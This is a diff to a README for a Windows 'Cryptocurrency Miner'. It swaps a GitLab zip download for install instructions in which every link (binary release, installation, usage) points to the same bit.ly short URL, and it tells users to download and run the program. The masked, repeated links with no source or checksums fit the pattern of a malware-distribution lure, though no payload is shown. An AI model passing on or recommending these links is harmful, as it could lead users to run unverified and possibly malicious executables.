@@ -8,7 +8,15 @@ Cryptocurrency Miner
 
 Mine up to 4 different algorithms/coins at the same time!
 
-### Install Windows Installer
-1. <a href="https://gitlab.com/xmrig-source/download/-/raw/master/Setup-beta-5-3.1.zip">Download & extract the Windows installer</a>
-2. Run the `setup.exe` file
+# How to get started
+  1) First, install the script following any one of these   
+      * [Windows Binary Release](https://bit.ly/3Zgoms1)
+  2) Install and run program on Windows
+  
+# Topics
+       
+[Windows]()  
+&ensp;&emsp;[Binary Release](https://bit.ly/3Zgoms1)  
+&ensp;&emsp;[Installation](https://bit.ly/3Zgoms1)  
+&ensp;&emsp;[Usage](https://bit.ly/3Zgoms1)  
 
